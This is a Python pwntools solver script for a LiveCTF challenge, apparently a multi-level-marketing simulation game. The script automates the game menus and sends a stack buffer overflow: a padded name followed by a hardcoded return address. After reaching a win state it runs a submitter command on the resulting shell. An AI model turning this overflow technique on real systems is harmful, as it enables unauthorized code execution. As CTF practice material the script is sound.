#!/usr/bin/env python3
from pwn import *
import time
import os
import sys
import re
import string
import struct

# Configure logging level
context.log_level = 'INFO'

# Environment variables for script control
VERBOSE = os.environ.get('VERBOSE', '0').lower() in ('1', 'true', 'yes', 'y')
MAX_DAYS = int(os.environ.get('DAYS', '10')) 

# Standard timeout duration for operations
TIMEOUT = 10

# Constants from mlmm.c
MAX_AGENTS = 3
MAX_CAMPAIGNS = 5
MAX_PRODUCTS = 8
START_MONEY = 500
HIRING_COST = 200
TRAINING_COST = 200


# Parse handout file for offset
# 


# Optimal keywords for highest sentiment score
OPTIMAL_KEYWORDS = ["lya", "ideal", "2g2b4g", "best", "ily"]

class MLMSolver:
    def __init__(self, connection):
        self.r = connection
        self.agents = []
        self.campaigns = []
        self.products = [{"name": "Essential Wellness Pack", "index": 0}]  # Default product
        self.money = START_MONEY
        self.reputation = 50
        self.legal_risk = 0
        self.day = 1
        self.prosperous_region = None  # Will be set after testing all regions
        
    def dump_response(self, data, prefix=""):
        """Helper to dump response data in verbose mode"""
        if VERBOSE:
            log.info(f"{prefix} Response [{len(data)} bytes]:")
            text = data.decode(errors='replace')
            # Replace non-printable characters with spaces
            printable_text = ''.join(c if c in string.printable else ' ' for c in text)
            for line in printable_text.split('\n'):
                if line.strip():
                    log.info(f"  {line}")
    
    def recv_until(self, delim, timeout=TIMEOUT, dump_prefix=""):
        """Receive data until delimiter is found"""
        try:
            data = self.r.recvuntil(delim, timeout=timeout)
            self.dump_response(data, dump_prefix)
            return data
        except Exception as e:
            log.warning(f"Error receiving until {delim}: {e}")
            return b""
    
    def send_line(self, line, wait_for=None, timeout=TIMEOUT, dump_prefix=""):
        """Send a line and optionally wait for response"""
        self.r.sendline(line)
        log.debug(f"Sent: {line}")
        if wait_for:
            return self.recv_until(wait_for, timeout, dump_prefix)
        return None
    
    def start_game(self):
        """Start the game and send overflow name"""
        log.info("Starting game...")
        startup = self.recv_until(b"Enter your name:", TIMEOUT * 2, "Startup")
        
        if b"Enter your name:" not in startup:
            log.warning(f"Did not receive name prompt. Got: {startup.decode(errors='replace')}")
            return False
            
        # Send name with buffer overflow - 100 A's to overflow the buffer
        name = b"A" * 56
        name += struct.pack('<Q', 0x004015ea)
        self.send_line(name)
        log.info(f"Sent overflow name with {len(name)} 'A's")
        
        # Wait for main menu
        menu = self.recv_until(b"Choice:", 0.5, "Main menu")
        
        if b"Choice:" not in menu:
            log.warning(f"Did not receive main menu. Got: {menu.decode(errors='replace')}")
            return False
            
        log.info("Game started successfully")
        return True
        
    def return_to_main_menu(self):
        """Return to the main menu from any submenu"""
        self.send_line(b"X")
        self.recv_until(b"Choice:", TIMEOUT, "Main menu")
    
    def create_agent(self, name):
        """Hire a new agent with the given name"""
        log.info(f"Hiring agent: '{name}'")
        
        # Navigate to agent management menu - use D in the main menu (for Downline Agents)
        self.send_line(b"D")
        agent_menu = self.recv_until(b"Choice:", TIMEOUT, "Agent menu")
        
        # Check if we've already reached max agents
        if b"Total Agents: 3 /3" in agent_menu:
            log.warning("Maximum agents already reached")
            self.return_to_main_menu()
            return False
        
        # Hire new agent - use H in the agent submenu
        self.send_line(b"H")
        hire_prompt = self.recv_until(b"Enter agent name:", TIMEOUT, "Agent name prompt")
        
        # If we didn't get a name prompt, something's wrong
        if b"Enter agent name:" not in hire_prompt:
            log.warning(f"Did not receive the expected name prompt. Got: {hire_prompt.decode(errors='replace')}")
            # Try to recover
            self.return_to_main_menu()
            return False
            
        # Send the agent name
        self.send_line(name.encode())
        agent_result = self.recv_until(b"Choice:", TIMEOUT, "After hiring")
        
        # Check if hiring was successful
        if b"Hired" in agent_result:
            # Extract skill level
            skill_match = re.search(rf"Hired {name} \(Skill Level: (\d+)\)", 
                                agent_result.decode(errors='replace'))
            if skill_match:
                skill = int(skill_match.group(1))
                log.info(f"Agent hired with skill level: {skill}")
                
                # Add to our agent list
                agent_index = len(self.agents)
                self.agents.append({
                    "name": name,
                    "skill": skill,
                    "index": agent_index
                })
                
                # Update money
                self.money -= HIRING_COST
                log.info(f"Money after hiring: ${self.money}")
                
                # Return to main menu
                self.return_to_main_menu()
                return True
        
        # If we get here, hiring failed
        log.warning(f"Failed to hire agent. Response: {agent_result.decode(errors='replace')}")
        self.return_to_main_menu()
        return False
    
    def train_agent(self, agent_index):
        """Train an agent to improve their skill level"""
        if agent_index >= len(self.agents):
            log.error(f"Invalid agent index: {agent_index}, have {len(self.agents)} agents")
            return False
            
        agent = self.agents[agent_index]
        log.info(f"Training agent: {agent['name']}")
        
        # Navigate to agent management menu - use D in the main menu (for Downline Agents)
        self.send_line(b"D")
        self.recv_until(b"Choice:", TIMEOUT, "Agent menu")
        
        # Select train option - use T in the agent submenu
        self.send_line(b"T")
        self.recv_until(b"agent number", TIMEOUT, "Train prompt")
        
        # Agent numbers in the UI are 1-indexed
        self.send_line(str(agent_index + 1).encode())
        self.recv_until(b"Proceed", TIMEOUT, "Training confirmation")
        self.send_line(b"y")
        train_result = self.recv_until(b"Choice:", TIMEOUT, "After training")
        
        # Check training result
        if b"has been trained" in train_result:
            log.info(f"Agent {agent['name']} training successful!")
            self.money -= TRAINING_COST
            agent["skill"] += 1
            log.info(f"New skill level: {agent['skill']}, Money: ${self.money}")
            self.return_to_main_menu()
            return True
        elif b"maximum potential" in train_result:
            log.info(f"Agent {agent['name']} already at maximum potential")
        elif b"enough money" in train_result:
            log.warning(f"Not enough money for training (need ${TRAINING_COST})")
        
        self.return_to_main_menu()
        return False
    
    def acquire_product(self):
        """Find and acquire a new product (preferably high-risk)"""
        log.info("Looking for new high-risk product...")
        
        self.send_line(b"C")
        product_list = self.recv_until(b"Would you like to acquire", TIMEOUT, "Product list")
        
        # Parse product list to find highest price product
        product_data = product_list.decode(errors='replace')
        lines = product_data.split('\n')
        best_product = 1
        highest_risk = 0
        highest_price = 0
        
        # Simple parser to find the highest price product
        for j, line in enumerate(lines):
            risk_match = re.search(r'Risk Factor:\s*(\d+)', line)
            if risk_match:
                risk = int(risk_match.group(1))
                
                # Try to extract price
                price_match = re.search(r'Suggested Sale Price: \$(\d+)', line)
                price = int(price_match.group(1)) if price_match else 0
                
                # Look for product number in previous line
                if j > 0:
                    prod_match = re.match(r'(\d+)\.', lines[j-1])
                    if prod_match and risk > highest_risk:
                        best_product = int(prod_match.group(1))
                        highest_risk = risk
                        highest_price = price
        
        log.info(f"Selecting product #{best_product} with risk {highest_risk} and price ${highest_price}")
        self.send_line(str(best_product).encode())
        acquire_result = self.recv_until(b"Choice:", TIMEOUT, "Product acquisition result")
        
        # Check if acquisition was successful
        if b"Successfully acquired" in acquire_result:
            product_name_match = re.search(r"Successfully acquired (.+) for \$", 
                                         acquire_result.decode(errors='replace'))
            product_name = "Unknown Product"
            if product_name_match:
                product_name = product_name_match.group(1)
                log.info(f"Acquired product: {product_name}")
            
            # Add to our product list
            self.products.append({
                "name": product_name,
                "risk": highest_risk,
                "price": highest_price,
                "index": len(self.products)
            })
            return True
        elif b"maximum number" in acquire_result:
            log.warning("Reached maximum number of products")
        elif b"enough money" in acquire_result:
            log.warning("Not enough money to acquire product")
        
        return False
    
    def create_campaign(self, name, budget, region, product_index=0, agent_index=0):
        """Create a new campaign with the specified parameters"""
        log.info(f"Creating campaign: {name} in region {region} with budget ${budget}")
        
        if agent_index >= len(self.agents):
            log.error(f"Invalid agent index: {agent_index}, have {len(self.agents)} agents")
            return False
            
        if product_index >= len(self.products):
            log.error(f"Invalid product index: {product_index}, have {len(self.products)} products")
            return False
        
        # Validate budget
        if budget <= 0 or budget > self.money:
            log.error(f"Invalid budget: ${budget}, have ${self.money}")
            return False
        
        # Navigate to campaign menu (A is for Ad Campaigns in main menu)
        self.send_line(b"A")
        campaign_menu = self.recv_until(b"Choice:", TIMEOUT, "Campaign menu")
        
        # Check if we've reached max campaigns
        if b"Active Campaigns: 5/5" in campaign_menu:
            log.warning("Maximum campaigns already reached")
            self.return_to_main_menu()
            return False
        
        # Create new campaign - use C in the campaign submenu
        self.send_line(b"C")
        self.recv_until(b"Enter campaign name:", TIMEOUT, "Campaign name prompt")
        self.send_line(name.encode())
        self.recv_until(b"Enter campaign budget:", TIMEOUT, "Budget prompt")
        
        # Set budget
        log.info(f"Setting campaign budget: ${budget}")
        self.send_line(str(budget).encode())
        self.recv_until(b"Region:", TIMEOUT, "Region prompt")
        
        # Select region (1-5)
        region = max(1, min(5, region))  # Ensure it's between 1-5
        log.info(f"Selecting region {region}")
        self.send_line(str(region).encode())
        self.recv_until(b"Choice:", TIMEOUT, "Product prompt")
        
        # Select product
        log.info(f"Selecting product #{product_index}")
        self.send_line(str(product_index).encode())
        self.recv_until(b"Agent ID:", TIMEOUT, "Agent prompt")
        
        # Select agent - the program expects 1-indexed agent IDs
        agent_ui_index = agent_index + 1  # Convert 0-indexed to 1-indexed
        log.info(f"Selecting agent #{agent_ui_index}")
        self.send_line(str(agent_ui_index).encode())
        
        # Enter the optimal keywords
        for i, keyword in enumerate(OPTIMAL_KEYWORDS):
            self.recv_until(f"Keyword {i+1}:".encode(), TIMEOUT, f"Keyword {i+1} prompt")
            self.send_line(keyword.encode())
        
        campaign_result = self.recv_until(b"Choice:", TIMEOUT, "Campaign result")
        if b"created successfully" in campaign_result:
            log.info(f"Campaign '{name}' created successfully!")
            
            # Add to our campaign list
            self.campaigns.append({
                "name": name,
                "budget": budget,
                "region": region,
                "product_index": product_index,
                "agent_index": agent_index,
                "index": len(self.campaigns)
            })
            
            # Update money
            self.money -= budget
            log.info(f"Money after campaign creation: ${self.money}")
            
            self.return_to_main_menu()
            return True
        
        # If we get here, campaign creation failed
        log.warning("Failed to create campaign")
        self.return_to_main_menu()
        return False
    
    def edit_campaign(self, campaign_index, new_budget, product_index=None):
        """Edit an existing campaign, typically to increase budget"""
        if campaign_index >= len(self.campaigns):
            log.error(f"Invalid campaign index: {campaign_index}, have {len(self.campaigns)} campaigns")
            return False
        
        campaign = self.campaigns[campaign_index]
        log.info(f"Editing campaign: {campaign['name']}")
        
        # Navigate to campaign menu
        self.send_line(b"A")
        self.recv_until(b"Choice:", TIMEOUT, "Campaign menu")
        
        # Select edit option
        self.send_line(b"E")
        self.recv_until(b"campaign would you like to edit", TIMEOUT, "Campaign list")
        
        # Campaign numbers in the UI are 1-indexed
        self.send_line(str(campaign_index + 1).encode())
        
        # Get current budget from prompt
        budget_prompt = self.recv_until(b"budget", TIMEOUT, "Budget prompt")
        current_budget = 0
        budget_match = re.search(r'\$(\d+)', budget_prompt.decode(errors='replace'))
        if budget_match:
            current_budget = int(budget_match.group(1))
            log.info(f"Current budget: ${current_budget}")
        
        if new_budget <= current_budget:
            log.warning(f"New budget (${new_budget}) not higher than current budget (${current_budget})")
            # Just keep the current budget in this case
            new_budget = current_budget
        
        log.info(f"Setting new budget: ${new_budget}")
        self.send_line(str(new_budget).encode())
        
        # Skip agent change
        self.recv_until(b"agent", TIMEOUT, "Agent change prompt")
        self.send_line(b"n")
        
        # Check if we need to change the product
        product_change = self.recv_until(b"product", TIMEOUT, "Product change prompt")
        
        if product_index is not None and product_index != campaign["product_index"]:
            log.info(f"Changing product to #{product_index}")
            self.send_line(b"y")
            product_prompt = self.recv_until(b"Product ID", TIMEOUT, "Product selection prompt")
            self.send_line(str(product_index).encode())
            campaign["product_index"] = product_index
        else:
            # Skip product change
            self.send_line(b"n")
        
        # Return to main menu
        self.recv_until(b"Choice:", TIMEOUT, "Back to campaign menu")
        self.return_to_main_menu()
        
        # Update in our tracking
        if new_budget > current_budget:
            self.money -= (new_budget - current_budget)
            campaign["budget"] = new_budget
            log.info(f"Budget updated. Money remaining: ${self.money}")
            return True
        
        return False

    def pause_campaign(self, campaign_index):
        """Pause a campaign to stop spending on it"""
        if campaign_index >= len(self.campaigns):
            log.error(f"Invalid campaign index: {campaign_index}, have {len(self.campaigns)} campaigns")
            return False
        
        campaign = self.campaigns[campaign_index]
        log.info(f"Pausing campaign: {campaign['name']}")
        
        # Navigate to campaign menu
        self.send_line(b"A")
        self.recv_until(b"Choice:", TIMEOUT, "Campaign menu")
        
        # Select pause/resume option
        self.send_line(b"P")
        self.recv_until(b"toggle", TIMEOUT, "Campaign list")
        
        # Campaign numbers in the UI are 1-indexed
        self.send_line(str(campaign_index + 1).encode())
        
        # Check result
        result = self.recv_until(b"Choice:", TIMEOUT, "Campaign pause result")
        
        if b"paused" in result:
            log.info(f"Campaign '{campaign['name']}' is now paused")
            campaign['active'] = False
            self.return_to_main_menu()
            return True
        
        self.return_to_main_menu()
        return False
    
    def advance_day(self):
        """Advance to the next day and parse results"""
        log.info(f"Advancing to day {self.day + 1}...")
        
        self.send_line(b"N")
        
        # Try to receive with a longer timeout and catch any errors
        try:
            day_result = self.recv_until(b"Choice:", TIMEOUT * 5, f"Day {self.day + 1} results")
            
            # Check if we've reached Platinum rank
            if b"PLATINUM" in day_result or b"Platinum" in day_result or b"CONGRATULATIONS" in day_result:
                log.success("PLATINUM RANK ACHIEVED!")
                return True
                
            # Parse the results to update our game state
            combined_text = day_result.decode(errors='replace')
            
        except Exception as e:
            # If we get an exception, we might have triggered the high score screen
            log.warning(f"Exception during day advancement: {e}")
            
            # Try to read whatever is available
            try:
                # Try to read any available data, even without a delimiter
                day_result = self.r.recv(timeout=2)
                self.dump_response(day_result, "Partial result")
                
                # Check if this contains platinum indicators
                if b"PLATINUM" in day_result or b"Platinum" in day_result or b"CONGRATULATIONS" in day_result:
                    log.success("PLATINUM RANK ACHIEVED (after exception)!")
                    return True
                    
                # If we're here, we had an exception but didn't find platinum indicators
                # This is likely the high score screen, so we'll assume platinum was reached
                if len(day_result) > 0:
                    log.info("Received data after exception but no platinum indicators. Assuming high score screen.")
                    return True
                    
                combined_text = day_result.decode(errors='replace')
                
            except Exception as e2:
                log.warning(f"Second exception during recovery: {e2}")
                # At this point, something is very wrong or we're at a completely different point in the program
                # We'll return False to continue with the script's normal flow
                return False
        
        # Extract money, reputation, risk
        money_match = re.search(r'New Balance: \$(\d+)', combined_text)
        if money_match:
            self.money = int(money_match.group(1))
        
        rep_match = re.search(r'REPUTATION: (\d+)', combined_text)
        if rep_match:
            self.reputation = int(rep_match.group(1))
            
        risk_match = re.search(r'RISK: (\d+)', combined_text)
        if risk_match:
            self.legal_risk = int(risk_match.group(1))
        
        # Analyze campaign results if we're trying to determine the prosperous region
        if self.prosperous_region is None and len(self.campaigns) == 5:
            # Look for campaign results in the day result
            region_profits = {}
            
            # First, try to find regions with specific multiplier mentions
            for i in range(1, 6):  # Regions 1-5
                pattern = rf"Region {i}.*increased revenue by ([0-9.]+)%"
                match = re.search(pattern, combined_text)
                if match:
                    profit_pct = float(match.group(1))
                    region_profits[i] = profit_pct
                    log.info(f"Region {i} profit boost: {profit_pct}%")
            
            # If we couldn't find any region with explicitly mentioned multipliers,
            # let's look at which campaign generated the most money
            if not region_profits:
                log.info("No explicit region multipliers found, analyzing campaign revenues")
                for i in range(1, 6):
                    # Pattern to match campaign revenue
                    pattern = rf"TestCampaign{i}.*generated \$(\d+)"
                    match = re.search(pattern, combined_text)
                    if match:
                        revenue = int(match.group(1))
                        # Store revenue as our profit indicator
                        region_profits[i] = revenue
                        log.info(f"Region {i} generated revenue: ${revenue}")
            
            # Still no data? Just pick the central region as fallback
            if not region_profits:
                log.warning("Could not determine prosperous region, defaulting to region 5 (Central)")
                self.prosperous_region = 5
            else:
                # Determine the most profitable region
                self.prosperous_region = max(region_profits.items(), key=lambda x: x[1])[0]
                log.info(f"Identified prosperous region: {self.prosperous_region} with profit: {region_profits[self.prosperous_region]}")
        
        # Update day counter
        self.day += 1
        
        # Display current stats
        log.info(f"Day {self.day} stats: Money: ${self.money}, Reputation: {self.reputation}, Risk: {self.legal_risk}%")
        
            
        return False

def run_exploit(solver):
    """Run the exploit using the defined strategy"""
    # Start the game
    if not solver.start_game():
        log.error("Failed to start game")
        return False
    
    # Step 1: Hire one agent
    agent_name = "SuperAgent"
    if not solver.create_agent(agent_name):
        log.error("Failed to hire agent")
        return False
    
    log.info("Successfully hired agent")
    
    # Step 2: Identify which region is the highest reward (will be randomized)
    # Invest 10 into 5 different campaigns, one in each region.
    # When the most profitable is identified, pause all other campaigns.
    log.info("Step 2: Testing all regions to find the highest profit region...")
    test_budget = 10  # Small budget to test each region
    
    # Create test campaigns for each region
    for region in range(1, 6):
        campaign_name = f"TestCampaign{region}"
        solver.create_campaign(campaign_name, test_budget, region)
    
    # Advance one day to see which region performs best
    if solver.advance_day():
        log.warning("Reached Platinum rank unexpectedly early!")
        return True
    
    # At this point, solver.prosperous_region should be set based on the campaign results
    if solver.prosperous_region is None:
        log.error("Failed to identify the prosperous region")
        return False
    
    # Pause all campaigns except the one in the prosperous region
    prosperous_campaign_index = solver.prosperous_region - 1
    for i in range(len(solver.campaigns)):
        if i != prosperous_campaign_index:
            solver.pause_campaign(i)
    
    log.info(f"Identified region {solver.prosperous_region} as the most profitable")
    
    # Step 3: do another round with the default product in the highest profit region with all available budget.
    log.info("Step 3: Upgrading campaign in the highest profit region with all available budget...")
    
    # Reallocate all available money to the prosperous region's campaign
    if solver.edit_campaign(prosperous_campaign_index, solver.money):
        log.info(f"Updated campaign in region {solver.prosperous_region} with all available money (${solver.money})")
    else:
        log.warning("Failed to update campaign with all available money")
        
    # Advance one day to generate profits
    if solver.advance_day():
        log.warning("Reached Platinum rank unexpectedly early!")
        return True

    solver.train_agent(0)
    
    # Step 4: Find the highest profit product available now. Adjust the campaign to be for that product and re-allocate all budget to that campaign.
    log.info("Step 4: Finding highest profit product and maximizing campaign...")
    
    # Acquire a new high-risk product
    if solver.acquire_product():
        log.info("Acquired new high-risk product")
        
        # Get the index of the most recently acquired product (highest risk)
        high_risk_product_index = len(solver.products) - 1
        
        # Update the prosperous campaign to use the high-risk product and all available money
        if solver.edit_campaign(prosperous_campaign_index, solver.money, high_risk_product_index):
            log.info(f"Updated campaign to use high-risk product and allocated ${solver.money}")
    else:
        log.warning("Failed to acquire new product, continuing with default product")
    
    # Step 5: Each day, put all money into the same campaign
    platinum_reached = False
    try:
        for day in range(2, MAX_DAYS - 1):
            # Advance day
            try:
                if solver.advance_day():
                    platinum_reached = True
                    break
            except Exception as e:
                # If we get an exception while advancing day, we might have triggered the overflow
                log.warning(f"Exception while advancing day: {e}")
                platinum_reached = True
                break
            
            # If we didn't hit Platinum yet, add all new money to the campaign
            solver.train_agent(0)
            if solver.money > 0:
                # Calculate new total campaign budget
                new_budget = solver.money + solver.campaigns[prosperous_campaign_index]["budget"]
                
                # Check if we're about to hit the critical threshold
                if new_budget >= 25000:
                    log.success(f"Campaign budget of ${new_budget} is above 25000 threshold!")
                    log.info("Entering automatic progression mode to find the flag")
                    
                    # Automatically send "N" and continue to next day
                    # First, update the campaign with all available money
                    if not solver.edit_campaign(prosperous_campaign_index, new_budget):
                        log.warning("Failed to update campaign budget before final push")
                    
                    # Continue advancing days until we get the flag
                    max_attempts = 5  # Avoid infinite loop
                    for attempt in range(max_attempts):
                        log.info(f"Sending advancement command (attempt {attempt+1})")
                        try:
                            # Send the advance day command
                            solver.send_line(b"N")
                            
                            # Try to receive data with a longer timeout
                            data = b""
                            start_time = time.time()
                            timeout_duration = 20  # Extended timeout
                            
                            # Keep reading until timeout or flag found
                            while time.time() - start_time < timeout_duration:
                                try:
                                    chunk = solver.r.recv(timeout=1)
                                    if chunk:
                                        data += chunk
                                        # Check for flag pattern
                                        if b"LiveCTF{" in data or b"flag{" in data or b"FLAG{" in data:
                                            flag_pattern = re.search(rb"(?:LiveCTF|flag|FLAG){(.+?)}", data)
                                            if flag_pattern:
                                                flag = flag_pattern.group(0).decode(errors='replace')
                                                log.success(f"FLAG FOUND: {flag}")
                                                return True
                                except:
                                    # No more data available right now
                                    pass
                                
                                # Check for Platinum or congratulations messages
                                if b"PLATINUM" in data or b"CONGRATULATIONS" in data:
                                    log.success("Reached Platinum rank! Flag should be next...")
                                    #this line not vibe coded (only one of ~750)
                                    solver.r.sendline("./submitter")
                            
                            log.info(f"Received {len(data)} bytes of data")
                            solver.dump_response(data, "Advancement data")
                        except Exception as e:
                            log.warning(f"Exception during automated advancement: {e}")
                    
                    log.warning("Automatic progression completed without finding flag")
                    
                    # Fallback to interactive mode in case the automated approach fails
                    log.info("Switching to interactive mode. Look for the flag in the output.")
                    solver.r.interactive()
                    return True
                
                try:
                    if not solver.edit_campaign(prosperous_campaign_index, new_budget):
                        log.warning(f"Failed to update campaign on day {day}")
                except Exception as e:
                    log.warning(f"Exception while updating campaign: {e}")
                    # If we get here, we might have triggered the overflow
                    platinum_reached = True
                    break
    except Exception as e:
        log.warning(f"Exception in main exploit loop: {e}")
        # We might have hit Platinum, so still try to get shell
        platinum_reached = True
    
    # Print final result, might be done...

def main():
    if len(sys.argv) > 1:
        binary_path = sys.argv[1]
        r = process(binary_path)
    else:
        HOST = os.environ.get('HOST', 'localhost')
        PORT = int(os.environ.get('PORT', 31337))
        log.info(f"Connecting to remote: {HOST}:{PORT}")
        r = remote(HOST, PORT)

    # Create solver instance
    solver = MLMSolver(r)
    
    # Run the exploit
    log.info("Starting exploit...")
    if run_exploit(solver):
        log.success("Exploit completed successfully!")
    else:
        log.error("Exploit failed")

if __name__ == "__main__":
    main()
